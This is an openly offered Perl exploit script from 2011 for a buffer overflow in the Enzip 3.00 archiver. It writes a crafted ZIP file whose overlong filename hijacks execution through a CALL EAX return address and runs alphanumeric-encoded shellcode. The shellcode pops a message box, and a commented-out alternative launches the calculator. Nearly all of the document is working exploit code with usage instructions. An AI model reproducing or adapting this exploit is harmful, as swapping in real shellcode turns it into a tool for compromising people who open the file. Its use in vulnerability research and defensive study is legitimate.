#[+]Exploit Title: Exploit Buffer Overflow Enzip 3.00
#[+]Date: 01\06\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.bcuc.ac.uk/files/enzip300.exe
#[+]Version: 3.00
#[+]Tested on: WIN-XP SP3 PORTUGUESE BRAZILIAN 
#[+]CVE: N/A
#
#
#Create BY C4SS!0 G0M3S
#Louredo_@hotmail.com
#Website http://www.invasao.com.br
#
#
#HOW TO:
#
#OPEN THE FILE WITH THE SPECIALLY DESIGNED ENZIP 3.00
#THEN CLICK BUTTON TO THE RIGHT ON TOP OF THE FILE NAME
#SELECT OPTION THEN OPEN THE PROGRAM SHOWS IN MY CASE Shellcode is a MessageBox ()
#
#


if($#ARGV!=0)
{
system("cls");
system("color 4f");
sub usage
{
print "\n\n".                  
      "             ||========================================||\n".
	  "             ||                                        ||\n".
	  "             ||    Exploit Buffer Overflow Enzip 3.00  ||\n".
	  "             ||    Created BY C4SS!0 G0M3S             ||\n".
	  "             ||    Louredo_\@hotmail.com                ||\n".
	  "             ||                                        ||\n".
	  "             ||========================================||\n\n\n";

	  
print "[+]Exploit: Exploit Buffer Overflow Enzip 3.00\n";
print "[+]Date: 01\\06\\2011\n";
print "[+]Author: C4SS!0 G0M3S\n";
print "[+]Home: www.invasao.com.br\n";
print "[+]Version: 3.00\n";
print "[+]Tested On: WIN-XP SP3 Portuguese Brazilian\n";
print "[+]E-mail: Louredo_\@hotmail.com\n\n";
print "[+]Note:\n\nRead the comments above to Learn How to Exploit Works\n\n\n";

}
usage;
print "[-]Usage: $0 <File Name>\n";
print "[-]Exemple: $0 exploit.zip\n";
exit(0);
	 
}
	  

my $ldf_header = "\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .
"\x00\x00\x00";

my $cdf_header = "\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f".
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";

my $eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00".
"\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00".
"\x02\x10\x00\x00".
"\x00\x00";
usage;
print "[*]Preparing payload\n";
sleep(1);

my $payload = "\x41" x 1024;
$payload .= "BBBB"; #VALUE DE EAX
$payload .= "CCCC"; #VALUE DE EDX
$payload .= "DDDD"; #VALUE DE ECX




$payload .= "\x42" x 1022;
$payload .= pack('V',0x5D54296F); # CALL EAX COMCTL32.DLL



$payload .= "\x43" x 40;


print "[*]Identifying the length Shellcode\n";
sleep(1);

#
#
#SHELLCODE ENCODER USING ALPHA 2 BASEADDRESS EAX
#
#PROMPT:
#
#C:\alpha> alpha2 --uppercase eax < File_name.txt
#
#

$shellcode = 
"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI6SYP03O903XRWC9KPPRHR".
"LBL10Q03XWCP26N2DU8453CRE3BV4F8OKCKUMK0CL0PKO8SZ0P38R0R89QN3W6PZOK1O1TQTQB14Q0QS".
"X51E73UW22HPMCUSCT3PT0ZV2PPNYP0NNMPSLKON1VSYYVSN26SYKF1RHPSWP10WPSXQWP00MFSSXV3W".
"Q6PWPBHQ00CWDV3SXU4Q0W2RYRHRO3YD43UE8QU2XD0RLV4V9PSRHGQP0WPQ0CX73P4630SPT1KBJQP1".
"C0QPRKOHPVSYPPPONJZXJK1SLKON6A";
#
#
#OR THIS SHELLCODE WinExec("CALC.EXE",0)
#
#PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIYKIPVQXIOO3L5FBPXLN9D
#46DJTNQ5N0XVQD84XK3M8KL33RXE8L4MUP02XOLSUO92XOFVCKEL3X4NNSM5RNJGJP2ELOOSRJM5M64X
#USVQ9WQKWLVSPJUT1XJDFWEZUB4O7SLKKUKUURKZP179M1XKMWRP8EKI2M8YSZW7KCJ8OPL0O7SHSPSY
#41GL7XXWKLCLNK35O0WQCSTPQY1VSXML5O6L5IQCNMHJUNJL1UUOX7VMIWMWK9PXYKN0QE1OFTNVOMUT
#YK7OGT8FOPYLP3K8W5UCOM83KYZA
#
#



print "[*]The length is Shellcode:".length($shellcode)."\n";
sleep(1);



$payload .= $shellcode; 
$payload .= "\x46" x (1568 - length($shellcode));


$payload .= "\x52\x58\x66\x05\xB2\x0B\x40\x40".
"\x40" x 10;
$payload .= "\x50\x98\xd1";


$payload .= "\x4a" x (4064 - length($payload));





$file = $ARGV[0];

$payload = $payload.".txt";
my $zip = $ldf_header.$payload.
              $cdf_header.$payload.
			  $eofcdf_header;
print "[*]Creating the File $file\n";

open(f,">$file") or die("ERROR\n$!\n");
print f $zip;
close(f);
print "[*]The File $file was Successfully Created\n";
sleep(1);
exit(0);
